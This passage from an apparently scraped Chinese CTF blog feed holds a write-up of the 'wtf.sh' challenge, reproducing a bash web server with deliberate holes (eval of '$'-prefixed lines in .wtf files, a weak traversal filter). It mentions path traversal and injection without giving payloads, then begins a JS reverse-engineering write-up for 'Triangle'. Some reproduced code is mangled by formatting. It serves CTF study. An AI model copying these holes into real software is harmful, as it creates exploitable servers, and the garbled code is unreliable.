<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> hash_password &#123; <span class="built_in">local</span> password=<span class="variable">$1</span>; (shasum &lt;&lt;&lt; <span class="variable">$&#123;password&#125;</span>) | cut -d\ -f1; &#125; <span class="comment"># hash usernames for lookup in the users_lookup table function hash_username &#123; local username=$1; (shasum &lt;&lt;&lt; $&#123;username&#125;) | cut -d\ -f1; &#125; # generate a random token, base64 encoded # on GNU base64 wraps at 76 characters, so we need to pass --wrap=0 function generate_token &#123; (head -c 64 | (base64 --wrap=0 || base64)) &lt; /dev/urandom 2&gt; /dev/null; &#125; function find_user_file &#123; local username=$1; local hashed=$(hash_username "$&#123;username&#125;"); local f; if [[ -n "$&#123;username&#125;" &amp;&amp; -e "users_lookup/$&#123;hashed&#125;" ]] then echo "users/$(cat "users_lookup/$&#123;hashed&#125;/userid")"; else echo "NONE"; # our failure case -- ugly but w/e... fi; return; &#125; # The caller is responsible for checking that the user doesn't exist already calling this function create_user &#123; local username=$1; local password=$2; local hashed_pass=$(hash_password $&#123;password&#125;); local hashed_username=$(hash_username "$&#123;username&#125;"); local token=$(generate_token); mkdir users 2&gt; /dev/null; # make sure users directory exists touch users/.nolist; # make sure that the users dir can't be listed touch users/.noread; # don't allow reading of user files directly mkdir users_lookup 2&gt; /dev/null; # make sure the username -&gt; userid lookup directory exists touch users_lookup/.nolist; # don't let it be listed local user_id=$(basename $(mktemp users/XXXXX)); # user files look like: # username # hashed_pass # token echo "$&#123;username&#125;" &gt; "users/$&#123;user_id&#125;"; echo "$&#123;hashed_pass&#125;" &gt;&gt; "users/$&#123;user_id&#125;"; echo "$&#123;token&#125;" &gt;&gt; "users/$&#123;user_id&#125;"; mkdir "users_lookup/$&#123;hashed_username&#125;" 2&gt; /dev/null; touch "users_lookup/$&#123;hashed_username&#125;/.nolist"; # lookup dir for this user can't be readable touch "users_lookup/$&#123;hashed_username&#125;/.noread"; # don't allow reading the lookup dir touch "users_lookup/$&#123;hashed_username&#125;/posts"; # lookup for posts this user has participated in echo "$&#123;user_id&#125;" &gt; "users_lookup/$&#123;hashed_username&#125;/userid"; # create reverse lookup echo $&#123;user_id&#125;; &#125; function check_password &#123; local username=$1; local password=$2; local userfile=$(find_user_file $&#123;username&#125;); if [[ $&#123;userfile&#125; = 'NONE' ]] then return 1; fi local hashed_pass=$(hash_password $&#123;password&#125;); local correct_hash=$(head -n2 $&#123;userfile&#125; | tail -n1); [[ $&#123;hashed_pass&#125; = $&#123;correct_hash&#125; ]]; return $?; &#125; function is_logged_in &#123; contains 'TOKEN' $&#123;!COOKIES[@]&#125; &amp;&amp; contains 'USERNAME' $&#123;!COOKIES[@]&#125;; local has_cookies=$? local userfile=$(find_user_file $&#123;COOKIES['USERNAME']&#125;); [[ $&#123;has_cookies&#125; \ &amp;&amp; $&#123;userfile&#125; != 'NONE' \ &amp;&amp; $(tail -n1 $&#123;userfile&#125; 2&gt;/dev/null) = $&#123;COOKIES['TOKEN']&#125; \ &amp;&amp; $(head -n1 $&#123;userfile&#125; 2&gt;/dev/null) = $&#123;COOKIES['USERNAME']&#125; \ ]]; return $?; &#125; function get_users_posts &#123; local username=$1; local hashed=$(hash_username "$&#123;username&#125;"); # we only have to iterate over posts a user has replied to while read -r post_id; do echo "posts/$&#123;post_id&#125;"; done &lt; "users_lookup/$&#123;hashed&#125;/posts"; &#125;</span></span><br></pre></td></tr></table></figure></div>
<p>(13)这里的一部分代码暴露了可以进行上传，处理并且管理reply的代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># config stuff PROCESS_LIMIT=512 # per connection PROFILE=false # shell options shopt -s extglob; # ~~ PROFILING ~~ if [[ $PROFILE = true ]] then PS4='+ $(date "+%s.%N") $(if [[ $&#123;FUNCNAME&#125; = "" ]]; then echo NONE; else echo "$&#123;FUNCNAME&#125;"; fi ) $&#123;LINENO&#125;\011 ' exec 3&gt;&amp;2 2&gt;/tmp/bashprof.$$.log set -x fi # sick facts about bash declare -a BASH_FACTS=( $'Bash has an `until` keyword, which is equivalent to `while not`.' $'Single and Double quotes do different things in bash -- single quotes do not interpolate variables, while double quotes do.' $'When globbing on arrays in bash, you have the option to use [*] and [@], which appear to both return all the elements of the array. However, [*] acts like a "splat operator", while [@] keeps all everything constrained to the same argument.' $'The bash array access syntax looks like $&#123;array[$idx]&#125;.' $'If you forget the brackets in an array access, bash will just return the first element of the array.' $'Bash didn\'t have Associative Arrays until Bash 4' $'The idomatic way of iterating over all the lines in a file in bash is `while read -r line; do &lt;something with line&gt;; done &lt; &lt;filename&gt;`' $'Loops are just commands. So, you can pipe things into and out of them!' ); source lib.sh # import stdlib VERSION="0.0.0.0.1 \"alphaest of bets\"" declare -a REPLY_HEADERS=( "X-Powered-By: wtf.sh $&#123;VERSION&#125;" # Fly the banner of wtf.sh proudly! "X-Bash-Fact: $(shuf --head-count=1 -e "$&#123;BASH_FACTS[@]&#125;")" # select a random BASH FACT to include ); declare -A URL_PARAMS # hashtable of url parameters declare -A POST_PARAMS # hashtable of post parameters declare -A HTTP_HEADERS # hashtable of http headers declare -A COOKIES # hashtable of cookies function log &#123; echo "[`date`] $@" 1&gt;&amp;9 &#125; urldecode() &#123; # urldecode &lt;string&gt; local url_encoded="$&#123;1//+/ &#125;" printf '%b' "$&#123;url_encoded//%/\\x&#125;" &#125; max_page_include_depth=64 page_include_depth=0 function include_page &#123; # include_page &lt;pathname&gt; local pathname=$1 local cmd="" [[ "$&#123;pathname:(-4)&#125;" = '.wtf' ]]; local can_execute=$?; page_include_depth=$(($page_include_depth+1)) if [[ $page_include_depth -lt $max_page_include_depth ]] then local line; while read -r line; do # check if we're in a script line or not ($ at the beginning implies script line) # also, our extension needs to be .wtf [[ "$" = "$&#123;line:0:1&#125;" &amp;&amp; $&#123;can_execute&#125; = 0 ]]; is_script=$?; # execute the line. if [[ $is_script = 0 ]] then cmd+=$'\n'"$&#123;line#"$"&#125;"; else if [[ -n $cmd ]] then eval "$cmd" || log "Error during execution of $&#123;cmd&#125;"; cmd="" fi echo $line fi done &lt; $&#123;pathname&#125; else echo "&lt;p&gt;Max include depth exceeded!&lt;p&gt;" fi &#125; function parse_headers &#123; while read -r line; do if [[ $line = $'\r' || $line == $'\n' ]] then break else a=($line) key=$&#123;a[0]%?&#125; value=$&#123;a[@]:1&#125; HTTP_HEADERS[$key]=$&#123;value:0:-1&#125;; # remove \r from end fi done &#125; function parse_cookies &#123; while read -d ';' -r cookie; do local key=$(cut -d\= -f1 &lt;&lt;&lt; "$&#123;cookie&#125;"); local value=$&#123;cookie#*=&#125;; COOKIES[$&#123;key&#125;]=$&#123;value&#125;; done &lt;&lt;&lt; "$&#123;HTTP_HEADERS['Cookie']&#125;;" # append a ; so we still get the last field -- read drops the last thing &gt;_&lt; &#125; function handle_connection &#123; ulimit -u "$&#123;PROCESS_LIMIT&#125;"; # limit num processes per connection # Parse query and any url parameters that may be in the path IFS=' ' read -r method path version # fast fail on empty request if [[ $&#123;method&#125; = '' ]] then return fi query=$&#123;path##*\?&#125;; if [[ $query != $path ]] then while read -d '&amp;' -r param; do IFS='=' read key value &lt;&lt;&lt; $&#123;param&#125;; URL_PARAMS[$key]=$(urldecode $value) done &lt;&lt;&lt; "$&#123;query&#125;&amp;" # add &amp; so last argument is seen fi request=("$method" "$path" "$version") path=$(urldecode $(cut -d\? -f1 &lt;&lt;&lt; "$&#123;path&#125;")) # strip url parameters, urldecode # parse headers parse_headers; # parse out cookie values, if they exist if contains "Cookie" "$&#123;!HTTP_HEADERS[@]&#125;" then parse_cookies; fi if [[ $method == "POST" ]] then # <span class="doctag">TODO:</span> handle multipart bodies local line; local n; n=$&#123;HTTP_HEADERS['Content-Length']&#125;; read -n$n -r line; params=($(sed "s/\&amp;/ /g" &lt;&lt;&lt; "$&#123;line&#125;")) for param in $&#123;params[@]&#125;; do IFS='=' read key value &lt;&lt;&lt; $&#123;param&#125;; POST_PARAMS[$key]=$(urldecode $value) done fi # if we know the IP (via an X-Forwarded-For header), stick the user in a sandbox # (Cloudflare will fill in this IP in prod, we can also have nginx fill it in in dev if we want) if contains "X-Forwarded-For" "$&#123;!HTTP_HEADERS[@]&#125;" then sandbox_dir="$((cksum &lt;&lt;&lt; $&#123;HTTP_HEADERS["X-Forwarded-For"]&#125;) | cut -d\ -f1).sandbox"; # create sandbox if it doesn't exist if [[ ! -e "$&#123;sandbox_dir&#125;" ]] then mkdir "$&#123;sandbox_dir&#125;"; # copy anything that isn't itself a sandbox to the dir cp -R !(*.sandbox) "$&#123;sandbox_dir&#125;"; fi cd "$&#123;sandbox_dir&#125;"; else log "WARNING: Not sandboxing: no X-Forwarded-For header found!" fi requested_path=$(pwd)/$&#123;path&#125; # if a directory is requested, try each of the following, in order # index.wtf, index.html local index_fills=("index.wtf" "index.html"); if [[ -d $&#123;requested_path&#125; ]] then for i in $&#123;index_fills&#125;; do if [[ -e "$&#123;requested_path&#125;/$&#123;i&#125;" ]] then requested_path="$&#123;requested_path&#125;/$&#123;i&#125;"; break; fi done fi # check for possible directory traversals / other undesirable path elements by # removing them and 503-ing if the string was changed test_path=$(sed "s/\.\.//g" &lt;&lt;&lt; "$&#123;requested_path&#125;") if [[ $&#123;test_path&#125; != $&#123;requested_path&#125; ]] then echo "HTTP/1.1 503 Forbidden" echo "Content-Type: text/html" for reply_header in "$&#123;REPLY_HEADERS[@]&#125;"; do echo "$&#123;reply_header&#125;" done printf "\r\n\r\n" echo "&lt;html&gt;&lt;title&gt;503&lt;/title&gt;&lt;body&gt;503 Forbidden&lt;/body&gt;&lt;/html&gt;" echo "&lt;p&gt;Sorry, directory traversal is strongly frowned upon here at wtf.sh enterprises&lt;/p&gt;"; log "503: $&#123;request[@]&#125;" exit 0; # terminate early for 503 fi [[ ! -e "$&#123;requested_path&#125;/.nolist" ]]; local can_list=$?; [[ ! -e "$(dirname "$&#123;requested_path&#125;")/.noread" ]]; local can_read=$?; if [[ -e $&#123;requested_path&#125; ]] then if [[ -f $&#123;requested_path&#125; \ &amp;&amp; $&#123;requested_path:(-4)&#125; != ".log"\ &amp;&amp; $&#123;can_read&#125; = 0 ]] # can't end in .log, can't have .noread in the parent directory then echo "HTTP/1.1 200 OK" echo "Content-Type: text/html" for reply_header in "$&#123;REPLY_HEADERS[@]&#125;"; do echo "$&#123;reply_header&#125;" done printf "\r\n\r\n" include_page $&#123;requested_path&#125;; elif [[ -d $&#123;requested_path&#125; \ &amp;&amp; $&#123;can_list&#125; = 0 ]] # handle directory listing if it isn't a file and no `.nolist` file in the directory then log "$(dirname "$&#123;requested_path&#125;")/.noread" echo "HTTP/1.1 200 OK" echo "Content-Type: text/html" for reply_header in "$&#123;REPLY_HEADERS[@]&#125;"; do echo "$&#123;reply_header&#125;" done printf "\r\n\r\n" echo "&lt;h3&gt;Index of $&#123;request[1]&#125;&lt;/h3&gt;" echo "&lt;ul&gt;" for d in $&#123;requested_path&#125;/*; do size_info=($(du -h $&#123;requested_path&#125; | tail -n 1)) echo "&lt;li&gt;&lt;a href="/$&#123;request[1]#"/"&#125;$&#123;d&#125;"&gt;$&#123;d&#125;&lt;/a&gt;: $&#123;size_info[0]&#125;&lt;/li&gt;" done echo "&lt;/ul&gt;" echo "&lt;font size=2&gt;generated by wtf.sh $&#123;VERSION&#125; on $(date)&lt;/font&gt;" else echo "HTTP/1.1 503 Forbidden" echo "Content-Type: text/html" for reply_header in "$&#123;REPLY_HEADERS[@]&#125;"; do echo "$&#123;reply_header&#125;" done printf "\r\n\r\n" echo "&lt;title&gt;503 Forbidden&lt;/title&gt;"; echo "&lt;h3&gt;I'm sorry, I'm afraid I can't let you see that&lt;/h3&gt;"; echo "&lt;p&gt;It seems that you tried to list a directory with a &lt;code&gt;.nolist&lt;/code&gt; file in it, or a &lt;code&gt;.noread&lt;/code&gt; file in it's parent, or a forbidden file type.&lt;/p&gt;"; echo "&lt;p&gt;If you think this was a mistake, I feel bad for you, son. I got 99 problems, but a 503 ain't one.&lt;/p&gt;"; log "503: $&#123;request[@]&#125;" exit 0; fi log "200: $&#123;request[@]&#125;" exit 0 else # If we were noread or nolist, send a 503, even though the resource doesn't even exist -- we don't want to leak what forbidden resources do and do not exist if [[ $&#123;can_read&#125; = 1 || $&#123;can_list&#125; = 1 ]]; then echo "HTTP/1.1 503 Not Found"; echo "Content-Type: text/html" for reply_header in "$&#123;REPLY_HEADERS[@]&#125;"; do echo "$&#123;reply_header&#125;" done printf "\r\n\r\n" echo "&lt;title&gt;503 Forbidden&lt;/title&gt;"; echo "&lt;h3&gt;I'm sorry, I'm afraid I can't let you see that&lt;/h3&gt;"; echo "&lt;p&gt;It seems that you tried to list a directory with a &lt;code&gt;.nolist&lt;/code&gt; file in it, or a &lt;code&gt;.noread&lt;/code&gt; file in it's parent, or a forbidden file type.&lt;/p&gt;"; echo "&lt;p&gt;If you think this was a mistake, I feel bad for you, son. I got 99 problems, but a 503 ain't one.&lt;/p&gt;"; log "503: $&#123;request[@]&#125;" else echo "HTTP/1.1 404 Not Found" echo "Content-Type: text/html" for reply_header in "$&#123;REPLY_HEADERS[@]&#125;"; do echo "$&#123;reply_header&#125;" done printf "\r\n\r\n" echo "&lt;html&gt;&lt;title&gt;404&lt;/title&gt;&lt;body&gt;404, not found:&lt;code&gt;$&#123;request[1]&#125;&lt;/code&gt;&lt;/body&gt;&lt;/html&gt;" log "404: $&#123;request[@]&#125;" fi exit 0 fi &#125; # start socat on specified port function start_server &#123; echo "wtf.sh $&#123;VERSION&#125;, starting!"; socat -T10 TCP-LISTEN:$2,fork,readbytes=4096,backlog=256,reuseaddr EXEC:"$1 -r" 9&gt;&amp;1 echo "Socket was occupied... try again later..."; &#125; if [[ $# != 1 ]] then echo "Usage: $0 port" exit fi if [[ $1 == '-r' ]] then handle_connection else start_server $0 $1 # start server on specified port fi</span></span><br></pre></td></tr></table></figure></div>
<p>提取：这段源码应该是在说<br> ①.导入文件，判断文件是否为.wtf<br> ②.当文件为.wtf且page_include_depth&lt;max_page_include_depth，则逐行读取文件<br> ③.当读取到开头为 $ 的可读取文件时，读取该文件并通过log函数记录日志</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">max_page_include_depth=64 </span><br><span class="line">page_include_depth=0 </span><br><span class="line"><span class="keyword">function</span> include_page &#123; </span><br><span class="line">	<span class="comment"># include_page &lt;pathname&gt; </span></span><br><span class="line">	<span class="built_in">local</span> pathname=<span class="variable">$1</span> </span><br><span class="line">	<span class="built_in">local</span> cmd=<span class="string">""</span> [[ <span class="string">"<span class="variable">$&#123;pathname:(-4)&#125;</span>"</span> = <span class="string">'.wtf'</span> ]]; </span><br><span class="line">	<span class="built_in">local</span> can_execute=$?; </span><br><span class="line">	page_include_depth=$((<span class="variable">$page_include_depth</span>+1)) </span><br><span class="line">	<span class="keyword">if</span> [[ <span class="variable">$page_include_depth</span> -lt <span class="variable">$max_page_include_depth</span> ]] </span><br><span class="line">t		hen <span class="built_in">local</span> line; </span><br><span class="line">	<span class="keyword">while</span> <span class="built_in">read</span> -r line; <span class="keyword">do</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># check if we're in a script line or not ($ at the beginning implies script line) </span></span><br><span class="line">	<span class="comment"># also, our extension needs to be .wtf [[ "$" = "$&#123;line:0:1&#125;" &amp;&amp; $&#123;can_execute&#125; = 0 ]]; </span></span><br><span class="line">		is_script=$?; </span><br><span class="line">	<span class="comment"># execute the line. </span></span><br><span class="line">	<span class="keyword">if</span> [[ <span class="variable">$is_script</span> = 0 ]] </span><br><span class="line">	<span class="keyword">then</span> </span><br><span class="line">		cmd+=$<span class="string">'\n'</span><span class="string">"<span class="variable">$&#123;line#"$"&#125;</span>"</span>; </span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> [[ -n <span class="variable">$cmd</span> ]] <span class="keyword">then</span> <span class="built_in">eval</span> <span class="string">"<span class="variable">$cmd</span>"</span> || <span class="built_in">log</span> <span class="string">"Error during execution of <span class="variable">$&#123;cmd&#125;</span>"</span>; </span><br><span class="line">	cmd=<span class="string">""</span> <span class="keyword">fi</span> <span class="built_in">echo</span> <span class="variable">$line</span> <span class="keyword">fi</span> <span class="keyword">done</span> &lt; <span class="variable">$&#123;pathname&#125;</span> </span><br><span class="line">	<span class="keyword">else</span> <span class="built_in">echo</span> <span class="string">"&lt;p&gt;Max include depth exceeded!&lt;p&gt;"</span> </span><br><span class="line"><span class="keyword">fi</span> &#125;</span><br></pre></td></tr></table></figure></div>
<p>从(8)里找到reply函数：根据发帖栏会将用户名一起写入。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> reply &#123; </span><br><span class="line">	<span class="built_in">local</span> post_id=<span class="variable">$1</span>; </span><br><span class="line">	<span class="built_in">local</span> username=<span class="variable">$2</span>; </span><br><span class="line">	<span class="built_in">local</span> text=<span class="variable">$3</span>; </span><br><span class="line">	<span class="built_in">local</span> hashed=$(hash_username <span class="string">"<span class="variable">$&#123;username&#125;</span>"</span>); </span><br><span class="line">	curr_id=$(<span class="keyword">for</span> d <span class="keyword">in</span> posts/<span class="variable">$&#123;post_id&#125;</span>/*; <span class="keyword">do</span> </span><br><span class="line">		basename <span class="variable">$d</span>; </span><br><span class="line">	<span class="keyword">done</span> | sort -n | tail -n 1); </span><br><span class="line">	next_reply_id=$(awk <span class="string">'&#123;print $1+1&#125;'</span> &lt;&lt;&lt; <span class="string">"<span class="variable">$&#123;curr_id&#125;</span>"</span>); </span><br><span class="line">	next_file=(posts/<span class="variable">$&#123;post_id&#125;</span>/<span class="variable">$&#123;next_reply_id&#125;</span>); </span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"<span class="variable">$&#123;username&#125;</span>"</span> &gt; <span class="string">"<span class="variable">$&#123;next_file&#125;</span>"</span>; </span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"RE: <span class="variable">$(nth_line 2 &lt; "posts/$&#123;post_id&#125;/1")</span>"</span> &gt;&gt; <span class="string">"<span class="variable">$&#123;next_file&#125;</span>"</span>; </span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"<span class="variable">$&#123;text&#125;</span>"</span> &gt;&gt; <span class="string">"<span class="variable">$&#123;next_file&#125;</span>"</span>; </span><br><span class="line">	<span class="comment"># add post this is in reply to to posts cache echo </span></span><br><span class="line">	<span class="string">"<span class="variable">$&#123;post_id&#125;</span>/<span class="variable">$&#123;next_reply_id&#125;</span>"</span> &gt;&gt; <span class="string">"users_lookup/<span class="variable">$&#123;hashed&#125;</span>/posts"</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>6.注册账号 并进行穿越测试,成功注入<br><img src="6.PNG" alt=""><br><img src="7.PNG" alt=""></p>
<p>7.</p>
]]></content>
      
        <categories>
            
            <category> CTF-WEB </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 路径穿越 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ctf-web-wtf.sh-150]]></title>
      <url>/2020/01/04/ctf-web-wtf-sh-150/</url>
      <content type="html"></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF攻防世界-WEB-Triangle]]></title>
      <url>/2020/01/01/ctf-web-Triangle/</url>
      <content type="html"><![CDATA[<div class="note info"><p>0x01 前要与心得</p></div>
1.JS逆向
2.代码审计

<p>感觉全篇坐下来，基本就是一道纯JS逆向题，不知道为什么分类到web里。</p>
<a id="more"></a>

</br>

<div class="note info"><p>0x02 解题流程与思路</p></div>
1.打开网页就有一个login按钮，尝试了下注入，发现好像没有注入点，扫描网页目录也没有什么收获。查看源码，找到login函数和3个JS文件。

<p><img src="1.PNG" alt=""></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">login</span></span>()&#123;</span><br><span class="line">	var input = document.getElementById(<span class="string">'password'</span>).value;</span><br><span class="line">	var enc = enc_pw(input);</span><br><span class="line">	var pw = get_pw();</span><br><span class="line">	<span class="keyword">if</span>(test_pw(enc, pw) == 1)&#123;</span><br><span class="line">		alert(<span class="string">'Well done!'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		alert(<span class="string">'Try again ...'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>2.根据源码，我们能找到3变量o1,o2,o3。同时找到3个JS文件，稍微查了一下，发现Unicorn.js是用JS实现的开源cpu模拟器。<br>还原JS代码：</p>
<details>
<summary>secret.js:     展开/折叠</summary>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">function test_pw(e,_)&#123;</span><br><span class="line">	var t&#x3D;stoh(atob(getBase64Image(&quot;eye&quot;))),</span><br><span class="line">	r&#x3D;4096,</span><br><span class="line">	m&#x3D;8192,</span><br><span class="line">	R&#x3D;12288,</span><br><span class="line">	a&#x3D;new uc.Unicorn(uc.ARCH_ARM,uc.MODE_ARM);</span><br><span class="line">	a.reg_write_i32(uc.ARM_REG_R9,m),</span><br><span class="line">	a.reg_write_i32(uc.ARM_REG_R10,R),</span><br><span class="line">	a.reg_write_i32(uc.ARM_REG_R8,_.length),</span><br><span class="line">	a.mem_map(r,4096,uc.PROT_ALL);</span><br><span class="line">	</span><br><span class="line">	for(var o&#x3D;0;o&lt;o1.length;o++)</span><br><span class="line">		a.mem_write(r+o,[t[o1[o]]]);</span><br><span class="line">	a.mem_map(m,4096,uc.PROT_ALL),</span><br><span class="line">	a.mem_write(m,stoh(_)),</span><br><span class="line">	a.mem_map(R,4096,uc.PROT_ALL),</span><br><span class="line">	a.mem_write(R,stoh(e));</span><br><span class="line">	</span><br><span class="line">	var u&#x3D;r,</span><br><span class="line">	c&#x3D;r+o1.length;</span><br><span class="line">	</span><br><span class="line">	return a.emu_start(u,c,0,0),</span><br><span class="line">	a.reg_read_i32(uc.ARM_REG_R5)</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">function enc_pw(e)</span><br><span class="line">&#123;</span><br><span class="line">	var _&#x3D;stoh(atob(getBase64Image(&quot;frei&quot;))),</span><br><span class="line">	t&#x3D;4096,</span><br><span class="line">	r&#x3D;8192,</span><br><span class="line">	m&#x3D;12288,</span><br><span class="line">	R&#x3D;new uc.Unicorn(uc.ARCH_ARM,uc.MODE_ARM);     &#x2F;&#x2F;创建ARM加密</span><br><span class="line">	</span><br><span class="line">	R.reg_write_i32(uc.ARM_REG_R8,r),</span><br><span class="line">	R.reg_write_i32(uc.ARM_REG_R9,m),</span><br><span class="line">	R.reg_write_i32(uc.ARM_REG_R10,e.length),</span><br><span class="line">	R.mem_map(t,4096,uc.PROT_ALL);</span><br><span class="line">	</span><br><span class="line">	for(var a&#x3D;0;a&lt;o2.length;a++)</span><br><span class="line">		R.mem_write(t+a,[_[o2[a]]]);</span><br><span class="line"></span><br><span class="line">	R.mem_map(r,4096,uc.PROT_ALL),        &#x2F;&#x2F;写入寄存器</span><br><span class="line">	R.mem_write(r,stoh(e)),</span><br><span class="line">	R.mem_map(m,4096,uc.PROT_ALL);</span><br><span class="line">	</span><br><span class="line">	var o&#x3D;t,u&#x3D;t+o2.length;</span><br><span class="line">	</span><br><span class="line">	return R.emu_start(o,u,0,0),htos(R.mem_read(m,e.length))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function get_pw()&#123;</span><br><span class="line">	for(var e&#x3D;stoh(atob(getBase64Image(&quot;templar&quot;))),_&#x3D;&quot;&quot;,t&#x3D;0;t&lt;o3.length;t++)</span><br><span class="line">	</span><br><span class="line">	_+&#x3D;String.fromCharCode(e[o3[t]]);</span><br><span class="line">	return _&#125;</span><br></pre></td></tr></table></figure></div>
</details>

<details>
<summary>util.js:     展开/折叠</summary>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function stoh(t)&#123;</span><br><span class="line">	return t.split(&quot;&quot;).map(function(t)&#123;</span><br><span class="line">		return t.charCodeAt(0)</span><br><span class="line">		&#125;)</span><br><span class="line">&#125;</span><br><span class="line">function htos(t)&#123;</span><br><span class="line">	return String.fromCharCode.apply(String,t)</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">function getBase64Image(t)&#123;</span><br><span class="line">	var e&#x3D;document.getElementById(t),</span><br><span class="line">	a&#x3D;document.createElement(&quot;canvas&quot;);</span><br><span class="line">	a.width&#x3D;e.width,</span><br><span class="line">	a.height&#x3D;e.height;</span><br><span class="line">	var n&#x3D;a.getContext(&quot;2d&quot;);</span><br><span class="line">	n.drawImage(e,0,0);</span><br><span class="line">	var r&#x3D;a.toDataURL(&quot;image&#x2F;png&quot;);</span><br><span class="line">	return r.replace(&#x2F;^data:image\&#x2F;(png|jpeg);base64,&#x2F;,&quot;&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</details>

<p>3.观察源代码，login函数中同时出现了3个函数：enc_pw(),get_pw(),test_pw()。<br>并且当 test_pw(enc_pw(document.getElementById(‘password’).value) , get_pw()) == 1 时，可以获得flag。</p>
